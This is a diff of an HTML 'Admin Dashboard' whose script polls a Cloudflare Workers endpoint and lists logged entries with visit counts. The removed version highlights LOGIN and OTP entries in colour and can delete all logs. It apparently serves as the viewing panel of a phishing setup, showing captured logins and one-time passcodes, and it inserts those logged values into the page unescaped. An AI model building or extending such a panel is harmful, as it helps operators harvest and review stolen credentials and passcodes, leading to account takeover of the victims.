@@ -3,154 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Control Panel</title>
+    <title>Admin Dashboard</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
-        body { background-color: #f4f7f6; color: #333; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f8f9fa; color: #333; padding-bottom: 30px; }
 
-        /* Navbar Styling */
-        .navbar {
-            background-color: #ffffff;
-            padding: 15px 25px;
+        /* Header */
+        .header {
+            background: #fff;
+            padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
             position: sticky;
             top: 0;
-            z-index: 1000;
+            z-index: 100;
         }
-        .navbar h2 { color: #315195; font-size: 20px; }
+        .header h1 { font-size: 18px; color: #315195; font-weight: 700; }
         
-        /* Click/Visit Counter on Right */
-        .counter-box {
-            background: #eef2ff;
-            color: #315195;
-            padding: 8px 15px;
-            border-radius: 50px;
-            font-weight: bold;
-            font-size: 14px;
-            border: 1px solid #d1dbff;
+        /* Visit Count Style */
+        .count-badge {
+            background: #315195;
+            color: #fff;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
         }
 
-        .container { max-width: 900px; margin: 25px auto; padding: 0 15px; }
+        .container { max-width: 800px; margin: 20px auto; padding: 0 15px; }
 
-        /* Controls */
-        .controls { display: flex; gap: 10px; margin-bottom: 20px; }
-        .btn { 
-            padding: 10px 20px; border: none; border-radius: 6px; 
-            cursor: pointer; font-weight: 600; transition: 0.3s; 
-        }
-        .btn-refresh { background-color: #315195; color: white; }
-        .btn-delete { background-color: #ff4d4d; color: white; }
-        .btn:hover { opacity: 0.8; }
-
-        /* Data Cards */
-        .card {
-            background: white;
-            border-radius: 12px;
+        /* Data Card */
+        .log-card {
+            background: #fff;
+            border-radius: 10px;
             padding: 15px;
-            margin-bottom: 12px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+            margin-bottom: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            border-left: 4px solid #315195;
             display: flex;
             flex-direction: column;
-            border-left: 5px solid #315195;
-            animation: fadeIn 0.4s ease;
+            gap: 5px;
         }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        .card-header { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #f0f0f0; padding-bottom: 5px; }
-        .card-type { font-weight: 800; color: #315195; font-size: 13px; text-transform: uppercase; }
-        .card-time { font-size: 12px; color: #999; }
-        .card-detail { font-size: 15px; color: #444; line-height: 1.4; word-break: break-all; font-weight: 500; }
+        .log-top { display: flex; justify-content: space-between; align-items: center; }
+        .log-type { font-size: 12px; font-weight: 800; color: #666; text-transform: uppercase; }
+        .log-time { font-size: 11px; color: #aaa; }
+        .log-detail { font-size: 15px; color: #222; font-weight: 500; word-break: break-all; }
 
-        .empty-msg { text-align: center; padding: 50px; color: #888; font-style: italic; }
+        /* Auto-Refresh Status Dot */
+        .status { font-size: 10px; color: #28a745; display: flex; align-items: center; gap: 4px; margin-top: 10px; justify-content: center; }
+        .dot { width: 6px; height: 6px; background: #28a745; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
+        
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="navbar">
-        <h2>Admin Dashboard</h2>
-        <div class="counter-box" id="visitCounter">Total Visits: 0</div>
+    <div class="header">
+        <h1>Dashboard</h1>
+        <div class="count-badge" id="visitCount">Visits: 0</div>
     </div>
 
     <div class="container">
-        <div class="controls">
-            <button class="btn btn-refresh" onclick="fetchData()">Refresh Data</button>
-            <button class="btn btn-delete" onclick="deleteAllData()">Clear All Logs</button>
-        </div>
-
-        <div id="dataList">
-            <div class="empty-msg">Loading latest logs...</div>
+        <div id="logsContainer">
+            </div>
+        
+        <div class="status">
+            <span class="dot"></span> Live: Auto-refreshing every 5s
         </div>
     </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        // 1. Data Fetch Karne ka Function
-        async function fetchData() {
+        async function loadLogs() {
             try {
-                const response = await fetch(workerURL);
-                const data = await response.json();
-                renderData(data);
-            } catch (err) {
-                console.error("Fetch Error:", err);
-            }
-        }
+                const res = await fetch(workerURL);
+                const data = await res.json();
+                
+                const container = document.getElementById('logsContainer');
+                const visitBadge = document.getElementById('visitCount');
+                
+                if (!data || data.length === 0) {
+                    container.innerHTML = "<p style='text-align:center; color:#999; margin-top:20px;'>No data available</p>";
+                    return;
+                }
 
-        // 2. Data ko Screen par dikhane ka Function
-        function renderData(logs) {
-            const list = document.getElementById('dataList');
-            const counter = document.getElementById('visitCounter');
-            
-            if (!logs || logs.length === 0) {
-                list.innerHTML = '<div class="empty-msg">No logs found.</div>';
-                counter.innerText = "Total Visits: 0";
-                return;
-            }
+                // Count total visits
+                const vCount = data.filter(item => item.type.includes("VISIT")).length;
+                visitBadge.innerText = `Visits: ${vCount}`;
 
-            // Page Visits count nikalna
-            const visitCount = logs.filter(log => log.type.includes("VISIT")).length;
-            counter.innerText = `Total Visits: ${visitCount}`;
-
-            let html = '';
-            logs.forEach(row => {
-                // Color change based on type
-                let borderColor = "#315195"; // Default Blue
-                if(row.type.includes("LOGIN")) borderColor = "#28a745"; // Green
-                if(row.type.includes("OTP")) borderColor = "#f39c12"; // Orange
-
-                html += `
-                    <div class="card" style="border-left-color: ${borderColor}">
-                        <div class="card-header">
-                            <span class="card-type">${row.type}</span>
-                            <span class="card-time">${row.time}</span>
+                // Render Logs
+                container.innerHTML = data.map(log => `
+                    <div class="log-card">
+                        <div class="log-top">
+                            <span class="log-type">${log.type}</span>
+                            <span class="log-time">${log.time}</span>
                         </div>
-                        <div class="card-detail">${row.detail}</div>
+                        <div class="log-detail">${log.detail}</div>
                     </div>
-                `;
-            });
-            list.innerHTML = html;
-        }
+                `).join('');
 
-        // 3. Sara Data Delete Karne ka Function
-        async function deleteAllData() {
-            if(!confirm("Are you sure you want to delete all logs?")) return;
-            
-            try {
-                await fetch(workerURL, { method: 'DELETE' });
-                fetchData(); // List refresh karo
-            } catch (err) {
-                alert("Error deleting data");
+            } catch (e) {
+                console.log("Error loading data...");
             }
         }
 
-        // Auto-refresh har 10 second mein
-        setInterval(fetchData, 10000);
+        // Auto Refresh logic (5 seconds)
+        setInterval(loadLogs, 5000);
         
-        // Pehli baar load hone par
-        window.onload = fetchData;
+        // Initial load
+        window.onload = loadLogs;
     </script>
 </body>
 </html>
